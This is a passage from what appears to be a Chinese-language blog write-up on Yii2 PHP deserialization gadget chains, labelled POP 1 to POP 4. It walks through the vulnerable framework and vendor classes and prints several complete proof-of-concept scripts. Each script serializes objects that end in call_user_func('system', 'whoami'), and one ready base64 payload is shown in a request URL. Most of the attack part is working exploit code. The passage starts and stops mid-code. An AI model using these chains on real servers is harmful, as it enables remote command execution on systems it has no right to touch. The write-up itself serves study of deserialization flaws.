class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// make sure cursor is closed</span><br>        <span class="hljs-keyword">$this</span>-&gt;reset();<br>    &#125;<br><br><br><span class="hljs-comment">// 这里的 _dataReader 参数可控，所以可以利用这个参数去执行其他类的 close() 函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_dataReader !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_batch = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_key = <span class="hljs-literal">null</span>;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/DbSession.php 中的 close() 函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;getIsActive()) &#123;<br>            <span class="hljs-comment">// prepare writeCallback fields before session closes</span><br>            <span class="hljs-keyword">$this</span>-&gt;fields = <span class="hljs-keyword">$this</span>-&gt;composeFields();<br>            YII_DEBUG ? session_write_close() : @session_write_close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIsActive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> session_status() === PHP_SESSION_ACTIVE;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/MultiFieldSession.php</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">composeFields</span>(<span class="hljs-params">$id = <span class="hljs-literal">null</span>, $data = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $fields = <span class="hljs-keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="hljs-keyword">$this</span>-&gt;writeCallback, <span class="hljs-keyword">$this</span>) : [];<br>        <span class="hljs-keyword">if</span> ($id !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($data !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;data&#x27;</span>] = $data;<br>        &#125;<br>        <span class="hljs-keyword">return</span> $fields;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/rest/IndexAction.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) &#123;<br>            call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;prepareDataProvider();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027211239754.png" alt="image-20211027211239754"></p><p><code>call_user_func</code> 的一个不常见特性：<a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027225853020.png" alt="image-20211027225853020"></p><p>主要的链就是</p><p>利用 <code>BatchQueryResult.php</code> 中的 <code>BatchQueryResult</code> 的析构函数为入口，在执行<code>reset()</code> 函数中的 <code>close()</code> 函数时因为这里的<code>_dataReader</code>参数可控所以有两种选择，第一时找其他类的 <code>close()</code>函数来执行第二个是寻找<code>__call</code> 魔术方法，这里先选择了第一种，找到了<code>DbSession.php</code> 中<code>DbSession</code>类的<code>close()</code>方法然后执行到<code>MultiFieldSession</code>的<code>composeFields()</code>方法，调用里面的<code>call_user_func()</code>函数去执行某个类中的方法，这里就寻找到了两个可以被调用的<code>run()</code>方法<code>IndexAction.php</code> 和 <code>CreateAction.php</code>，大佬都是使用 <code>IndexAction.php</code> 来构造的POC</p><p>利用<code>IndexAction</code> 构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> IndexAction();<br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?r=serialize/</span>serialize&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX0<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027124445391.png" alt="image-20211027124445391"></p><p>尝试利用 <code>CreateAction.php</code> 构造 POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> CreateAction();<br>            <span class="hljs-comment">// 这里 DbSession 继承了 MultiFieldSession 所以直接声明变量</span><br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p>这样也是可以的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027234634925.png" alt="image-20211027234634925"></p><blockquote><p>POC 的编写可以有根据程序的格式来写，和一般的不一样，看别人分析起来很顺利，看看自己就是憨批</p></blockquote><h3 id="POP-2"><a href="#POP-2" class="headerlink" title="POP 2"></a>POP 2</h3><p>这里主要选择上面的另一条路寻找 <code>__call()</code> ，感觉这个可行，然后分析参数是否可控</p><p>最后看见大师父们找的<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> $providers = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();<br>    ………………<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method, $attributes</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format($method, $attributes);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params">$formatter, $arguments = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter($formatter), $arguments);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params">$formatter</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[$formatter])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> $provider) &#123;<br>            <span class="hljs-keyword">if</span> (method_exists($provider, $formatter)) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter] = <span class="hljs-keyword">array</span>($provider, $formatter);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是可以利用 <code>call_user_func_array()</code></p></blockquote><p>这里的可控参数有<code>$formatters</code> 和 <code>$providers</code> 在<code>__call()</code> 函数中<code>$method</code> 就是 <code>close</code> <code>$attributes</code> 为空，在执行<code>format</code> 函数时传入的值就是 <code>close</code> 和 空，所以在执行 <code>getFormatter()</code> 函数时，就会选取 <code>$formatters</code> 数组中的一个以 <code>$formatter</code> 也就是 <code>close</code> 为键的值这一点我们是可以控制的，并且我们在后面执行<code>call_user_func_array()</code>时也需要选取一个无参函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br> <br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028173015512.png" alt="image-20211028173015512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028005049779.png" alt="image-20211028005049779"></p><h3 id="POP-3"><a href="#POP-3" class="headerlink" title="POP 3"></a>POP 3</h3><p>这里选择的思路就是选择其他的<code>__deestruct()</code>析构函数来调用<code>__call()</code>，这里的<code>__call()</code> 可以使用 POP2 的 <code>__call()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028105033811.png" alt="image-20211028105033811"></p><p>这里的<code>$this-&gt;processes</code>参数可控，然后控制这个参数去调用<code>Generator</code>类中的<code>__call()</code>去执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//vendor/codeception/codeception/ext/RunProcess.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $processes = [];<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;stopProcess();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopProcess</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (array_reverse(<span class="hljs-keyword">$this</span>-&gt;processes) <span class="hljs-keyword">as</span> $process) &#123;<br>            <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> $process Process  **/</span><br>            <span class="hljs-keyword">if</span> (!$process-&gt;isRunning()) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;output-&gt;debug(<span class="hljs-string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());<br>            $process-&gt;stop();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;processes = [];<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">private</span> $processes;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> $id;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>;<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 这里也可以借助 CheckAction 的 Run 方法来执行</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028111936675.png" alt="image-20211028111936675"></p><blockquote><p>主要还是利用之前的链子稍微修改了一下</p></blockquote><h3 id="POP-4"><a href="#POP-4" class="headerlink" title="POP 4"></a>POP 4</h3><p>这里找到了另外一个析构函数</p><p> 这里采用的是利用<code>__toString()</code>魔术方法来构造 pop 链</p><p>找到这个析构函数，然后跟进 <code>clearAll()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028114146219.png" alt="image-20211028114146219"></p><p>可以发现<code>clearAll()</code>函数调用了<code>clearKey()</code>，在<code>clearKey()</code>中执行了字符串拼接的操作，所以可以利用这一点来调用<code>__toString()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028114122258.png" alt="image-20211028114122258"></p><p>调用<code>__toString()</code>时控制参数调用<code>render()</code>，然后使用<code>__call()</code>魔术方法完成 POP 链的构造，之后的就可以利用之前的 部分 POP 链了</p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p><p><code>/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028124226068.png" alt="image-20211028124226068"></p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 